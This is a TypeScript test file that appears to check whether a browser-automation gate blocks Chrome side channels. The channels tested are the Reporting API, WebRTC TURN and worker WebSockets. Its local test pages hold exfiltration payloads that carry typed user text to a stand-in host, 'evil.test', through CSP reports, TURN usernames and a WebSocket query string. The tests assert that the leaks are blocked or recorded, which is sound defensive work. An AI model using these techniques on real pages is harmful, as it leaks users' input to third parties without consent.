import { execFileSync, spawnSync } from 'node:child_process';
import { existsSync, mkdtempSync, readFileSync } from 'node:fs';
import { createServer, type IncomingMessage, type ServerResponse } from 'node:http';
import { createServer as createSecureServer } from 'node:https';
import { createServer as createTcpServer } from 'node:net';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { afterAll, afterEach, beforeAll, describe, expect, it } from 'vitest';
import { CHROME_RETRY, FIXTURE_ARGS, createBrowserHarness, hasChrome } from './browser-harness.js';

// these tests pin the channels that chrome opens outside a frame. neither page layer of the gate sees them, and the
// proxy carries them with a check of the address only.

const TYPED = 'TYPEDTEXT12345';
const hits: Array<{ host: string; method: string; path: string; body: string }> = [];
const turnBytes: Buffer[] = [];
const closers: Array<() => void> = [];
let port = 0;
let securePort = 0;
let turnPort = 0;

// the reporting api works only in a secure context, so its test needs https. macos and linux have openssl on the
// path, git for windows has its own, and the test skips without it. the key and the cert are made for each run and
// are not kept.
const OPENSSL = [
  ...(spawnSync('openssl', ['version'], { stdio: 'ignore' }).status === 0 ? ['openssl'] : []),
  ...['C:/Program Files/Git/usr/bin/openssl.exe', 'C:/Program Files/Git/mingw64/bin/openssl.exe'].filter((path) => existsSync(path)),
][0];

const page = (title: string, body: string) => `<!doctype html><html><head><title>${title}</title></head><body>${body}</body></html>`;
const note = '<label>Note <input id="n" value=""></label><button id="go" type="button">Go</button><p id="out">-</p>';

function handle(req: IncomingMessage, res: ServerResponse, at: (host: string, path: string) => string): void {
  const chunks: Buffer[] = [];
  req.on('data', (chunk: Buffer) => chunks.push(chunk));
  req.on('end', () => {
    const host = (req.headers.host ?? '').split(':')[0]!;
    const path = req.url ?? '/';
    hits.push({ host, method: req.method ?? '', path, body: Buffer.concat(chunks).toString() });
    const html = (text: string, headers: Record<string, string> = {}) => res.writeHead(200, { 'content-type': 'text/html; charset=utf-8', ...headers }).end(text);
    if (host === 'evil.test') {
      return void res.writeHead(204, { 'access-control-allow-origin': String(req.headers.origin ?? '*'), 'access-control-allow-methods': 'POST', 'access-control-allow-headers': 'content-type' }).end();
    }
    const route = path.split('?')[0];
    if (route === '/report') {
      // the page puts typed text into its own address, and a csp report sends the address to the endpoint.
      return html(
        page('Report', `<h1>Report</h1><script>history.replaceState(null, '', '?q=${TYPED}'); setTimeout(() => { const i = new Image(); i.src = '/x.png'; document.body.append(i); }, 100);</script>`),
        { 'reporting-endpoints': `main="${at('evil.test', '/api-report')}"`, 'content-security-policy': "img-src 'none'; report-to main" },
      );
    }
    if (route === '/turn') {
      return html(
        page(
          'Turn',
          `${note}<p id="frame">-</p><script>
          document.getElementById('go').onclick = async () => {
            const out = document.getElementById('out');
            try {
              const pc = new RTCPeerConnection({ iceTransportPolicy: 'relay', iceServers: [{ urls: 'turn:evil.test:${turnPort}?transport=tcp', username: 'u-' + document.getElementById('n').value, credential: 'x' }] });
              pc.createDataChannel('d');
              await pc.setLocalDescription(await pc.createOffer());
              out.textContent = 'offered';
            } catch (e) { out.textContent = 'threw ' + e; }
          };
          // a frame that a script makes at once has a window of its own.
          const frame = document.createElement('iframe');
          document.body.append(frame);
          document.getElementById('frame').textContent = 'frame: ' + typeof frame.contentWindow.RTCPeerConnection;
        </script>`,
        ),
      );
    }
    if (route === '/frame') return html(page('frame', '<script>localStorage.setItem("k", "framed")</script>'));
    if (route === '/storage') return html(page('storage', '<p id="k"></p><script>document.getElementById("k").textContent = "stored: " + localStorage.getItem("k")</script>'));
    if (route === '/partition') return html(page('partition', `<iframe src="http://other.test:${port}/frame"></iframe>`));
    if (route === '/worker-socket') {
      return html(page('Socket', `${note}<script>
        document.getElementById('go').onclick = () => {
          const code = "onmessage = (e) => { const s = new WebSocket('ws://evil.test:${port}/s?note=' + e.data); s.onerror = () => postMessage('error'); s.onopen = () => postMessage('open'); };";
          const w = new Worker(URL.createObjectURL(new Blob([code], { type: 'text/javascript' })));
          w.onmessage = (m) => (document.getElementById('out').textContent = m.data);
          w.postMessage(document.getElementById('n').value);
        };
      </script>`));
    }
    html(page('ok', 'ok'));
  });
}

// a stun answer 401 with a realm and a nonce, so chrome sends its allocate again with the username.
function unauthorized(request: Buffer): Buffer {
  const attr = (type: number, value: Buffer) => {
    const head = Buffer.alloc(4);
    head.writeUInt16BE(type, 0);
    head.writeUInt16BE(value.length, 2);
    return Buffer.concat([head, value, Buffer.alloc((4 - (value.length % 4)) % 4)]);
  };
  const body = Buffer.concat([attr(0x0009, Buffer.concat([Buffer.from([0, 0, 4, 1]), Buffer.from('Unauthorized')])), attr(0x0014, Buffer.from('test')), attr(0x0015, Buffer.from('nonce123'))]);
  const head = Buffer.alloc(20);
  head.writeUInt16BE(0x0113, 0);
  head.writeUInt16BE(body.length, 2);
  request.copy(head, 4, 4, 20);
  return Buffer.concat([head, body]);
}

const listen = (server: { listen(port: number, host: string, done: () => void): unknown; address(): unknown; close(): unknown }) =>
  new Promise<number>((resolve) => {
    closers.push(() => server.close());
    server.listen(0, '127.0.0.1', () => resolve((server.address() as { port: number }).port));
  });

beforeAll(async () => {
  const turn = createTcpServer((socket) => {
    let buffered = Buffer.alloc(0);
    socket.on('error', () => undefined);
    socket.on('data', (chunk: Buffer) => {
      turnBytes.push(chunk);
      buffered = Buffer.concat([buffered, chunk]);
      while (buffered.length >= 20 && buffered.length >= 20 + buffered.readUInt16BE(2)) {
        const message = buffered.subarray(0, 20 + buffered.readUInt16BE(2));
        buffered = buffered.subarray(message.length);
        if (message.readUInt16BE(0) === 0x0003) socket.write(unauthorized(message));
      }
    });
  });
  turnPort = await listen(turn);
  // the web socket of the worker reaches this server too. it answers no upgrade, which is enough for the record.
  port = await listen(createServer((req, res) => handle(req, res, (host, path) => `http://${host}:${port}${path}`)));
  if (OPENSSL) {
    const dir = mkdtempSync(join(tmpdir(), 'okc-cert-'));
    execFileSync(OPENSSL, ['req', '-x509', '-newkey', 'rsa:2048', '-nodes', '-keyout', join(dir, 'key.pem'), '-out', join(dir, 'cert.pem'), '-days', '1', '-subj', '/CN=shop.test', '-addext', 'subjectAltName=DNS:shop.test,DNS:evil.test'], { stdio: 'ignore' });
    const secure = createSecureServer({ key: readFileSync(join(dir, 'key.pem')), cert: readFileSync(join(dir, 'cert.pem')) }, (req, res) => handle(req, res, (host, path) => `https://${host}:${securePort}${path}`));
    securePort = await listen(secure);
  }
});
afterAll(() => {
  for (const close of closers) close();
});

type Harness = ReturnType<typeof createBrowserHarness>;
const open: Harness[] = [];
// a stop closes chrome and saves the trace. on a busy machine that takes longer than the 10 s of a hook.
afterEach(async () => {
  for (const each of open.splice(0)) await each.worker.stop();
  hits.length = 0;
  turnBytes.length = 0;
}, 60_000);
const harness = (args: string[] = []) => {
  const made = createBrowserHarness({ args: [...FIXTURE_ARGS, ...args] });
  open.push(made);
  return made;
};
const wait = (ms: number) => new Promise((resolve) => setTimeout(resolve, ms));
const refOf = (text: string, pattern: RegExp) => pattern.exec(text)![1]!;

async function typeAndGo(h: Harness, path: string) {
  const opened = await h.run('browser_open', { url: `http://shop.test:${port}${path}` });
  const typed = await h.run('browser_type', { ref: refOf(opened.content, /textbox "Note" \[ref=(s\d+e\d+)\]/), element: 'Note', text: TYPED });
  return h.run('browser_click', { ref: refOf(typed.content, /button "Go" \[ref=(s\d+e\d+)\]/), element: 'Go' });
}

describe.skipIf(!hasChrome())('channels of chrome outside a frame', { timeout: 60_000, retry: CHROME_RETRY }, () => {
  it.skipIf(!OPENSSL)('sends no report of the reporting api', async () => {
    const h = harness(['--ignore-certificate-errors']);
    const out = await h.run('browser_open', { url: `https://shop.test:${securePort}/report` });
    expect(out.isError).toBe(false);
    // chrome sends the reports about 1.5 s after the violation. the wait is more than twice as long.
    await wait(4000);
    expect(hits.filter((each) => each.host === 'evil.test')).toEqual([]);
  });

  it('gives a page no webrtc, so no turn server gets typed text, also from a frame that a script makes', async () => {
    const h = harness();
    await typeAndGo(h, '/turn');
    await wait(3000);
    expect(Buffer.concat(turnBytes).toString('latin1')).not.toContain(TYPED);
    expect(turnBytes).toEqual([]);
    const snap = await h.run('browser_snapshot', {});
    expect(snap.content).toContain('threw');
    expect(snap.content).toContain('frame: undefined');
  });

  // chrome uses only the last --disable-features, so the list of the app must keep the list of playwright. playwright
  // turns storage partitioning off, so a frame of another site shares its storage with that site at the top.
  it('keeps the features that playwright turns off', async () => {
    const h = harness();
    await h.run('browser_open', { url: `http://shop.test:${port}/` });
    await h.run('browser_allow_domain', { url: `http://shop.test:${port}/`, domain: 'other.test', reason: 'test' });
    await h.run('browser_open', { url: `http://shop.test:${port}/partition` });
    await wait(500);
    const top = await h.run('browser_open', { url: `http://other.test:${port}/storage` });
    expect(top.content).toContain('stored: framed');
  });

  it('records a host off the allowlist that the proxy let a connection reach, such as the socket of a worker', async () => {
    const h = harness();
    await typeAndGo(h, '/worker-socket');
    await wait(1500);
    await h.run('browser_snapshot', {});
    const offsite = h.steps().map((row) => String(row.offsiteHosts ?? ''));
    expect(offsite.join(' ')).toContain('evil.test');
  });
});
